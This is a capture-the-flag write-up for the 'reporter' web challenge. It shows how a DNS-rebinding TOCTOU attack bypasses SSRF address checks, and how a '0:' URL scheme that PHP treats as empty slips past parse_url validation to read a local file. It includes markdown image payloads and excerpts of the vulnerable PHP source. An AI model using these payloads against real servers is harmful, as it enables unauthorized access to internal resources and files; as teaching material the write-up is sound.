# reporter - 498pts - 4 solves 
Author: rekter0

> Reporter is an online markdown reporting tool.
> it's free to use for everyone.
> there's a secret report we need located [here](http://reporter.3k.ctf.to/secret_report)
> 
> [source](./src)

---

## Walkthrough
The application provide markdown hosting service and it will automatically download and embed external images (or any files) to the 'report'.

There are 4 buttons on the interface: `Edit`, `Preview`, `Save`, and `Deliver`.

The first target of the challenge is to access the `secret_report`.

```html
curl http://reporter.3k.ctf.to/secret_report
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
...
```
Well, knew that.

### Exploiting TOCTOU of the domain checking

Interesting things happen in [backend.php](./src/backend.php). 
```php
if(@$_POST['deliver']){
	$thisDoc=file_get_contents($dir.'/file.html');
	$images = preg_match_all("/<img src=\"(.*?)\" /", $thisDoc, $matches);
	foreach ($matches[1] as $key => $value) {
		$thisDoc = str_replace($value , "data:image/png;base64,".base64_encode(fetch_remote_file($value)) , $thisDoc ) ;
  }
```

When user click on the `deliver` button it will get the saved document, `fetch_remote_file` and embed it to the report with `base64`. Therefore users can embed images from external image hosting sites such as imgur etc.

How about embedding the `secret_report`? It does not work as it do a long list of checks:
```php
function fetch_remote_file($url) {
    $config['disallowed_remote_hosts'] = array('localhost');
    $config['disallowed_remote_addresses'] = array("0.0.0.0/8", "10.0.0.0/8", "100.64.0.0/10", "127.0.0.0/8", "169.254.0.0/16", "172.16.0.0/12", "192.0.0.0/29", "192.0.2.0/24", "192.88.99.0/24", "192.168.0.0/16", "198.18.0.0/15", "198.51.100.0/24", "203.0.113.0/24", "224.0.0.0/4", "240.0.0.0/4",);

    // ...

    $addresses = get_ip_by_hostname($url_components['host']);
    $destination_address = $addresses[0];

    // ... checks if the destination_address is in the disallowed list ...

    $opts = array('http' => array('follow_location' => 0,));
    $context = stream_context_create($opts);
    return file_get_contents($url, false, $context);
}
function get_ip_by_hostname($hostname) {
    $addresses = @gethostbynamel($hostname);
    if (!$addresses) {
      // ... more attempts to get dns A records ...
    }
    return $addresses;
}
```

If we change the DNS record very quickly, which the DNS server return `1.1.1.1` at `get_ip_by_hostname` when it do the checking, and we return `127.0.0.1` at `file_get_contents` we can access the `localhost` and maybe we can get the `secret_report`.

Therefore I wrote a [script](./dnsrebind.js) to act as a nameserver and give different responses.

```bash
$ dig +short 4kctf.example.com @8.8.8.8
1.1.1.1
$ dig +short 4kctf.example.com @8.8.8.8
127.0.0.1
```

payload
```
![](http://4kctf.example.com/secret_report/)
```

The result is a file listing with two files:
```
3ac45ca05705d39ed27d7baa8b70ecd560b69902.php
secret2

63b4bacc828939706ea2a84822a4505efa73ee3e.php
not much here
```

The `3ac45ca05705d39ed27d7baa8b70ecd560b69902.php` is suspicious as it have 50 bytes but only 7 bytes returned from server. Maybe the flag is there.

### Wonders of PHP: empty("0") == true

I crafted this payload to read the file and get the flag.
```
![](0:/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php)
```

Back to the `backend.php` `fetch_remote_file`, besides DNS checking it also `parse_url` and checks `scheme`, `port`, etc. 
```php
function fetch_remote_file($url) {
    // ...
    $url_components = @parse_url($url);
    if (!isset($url_components['scheme'])) {
        return false;
    }
    if (@($url_components['port'])) {
        return false;
    }
    if (!$url_components) {
        return false;
    }
    if ((!empty($url_components['scheme']) && !in_array($url_components['scheme'], array('http', 'https')))) {
        return false;
    }
    if (array_key_exists("user", $url_components) || array_key_exists("pass", $url_components)) {
        return false;
    }
    // ...
    return file_get_contents($url, false, $context);
```

`parse_url` will parse as follows
```
array(2) {
  ["scheme"]=>
  string(1) "0"
  ["path"]=>
  string(62) "/../secret_report/3ac45ca05705d39ed27d7baa8b70ecd560b69902.php"
}
```
Where the `scheme` will return `true` for `isset` and `true` for `empty` (`empty("0") == true`), and for `file_get_contents` it will recognize `0:` as a folder and `0:/../` as current folder. 

## Related
- [DNS rebinding](https://en.wikipedia.org/wiki/DNS_rebinding)
